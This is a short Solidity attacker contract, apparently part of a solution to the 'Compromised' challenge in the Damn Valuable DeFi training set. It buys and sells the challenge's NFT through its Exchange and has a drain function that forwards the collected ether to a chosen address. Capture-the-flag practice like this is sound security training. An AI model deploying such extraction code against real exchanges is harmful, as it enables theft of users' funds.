pragma solidity =0.8.25;

import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";


contract ExploitContract {
    Exchange public immutable exchange;
    DamnValuableNFT public immutable nft;

    constructor(Exchange _exchange, DamnValuableNFT _nft) {
        exchange = _exchange;
        nft = _nft;
    }

    function buy() public payable returns (uint256) {
        return exchange.buyOne{value: msg.value}();
    }

    function sell(uint256 id) public {
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
    }

    function drain(address to) public {
        uint256 balance = address(this).balance;
        payable(to).transfer(balance);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    fallback() external payable {}
}
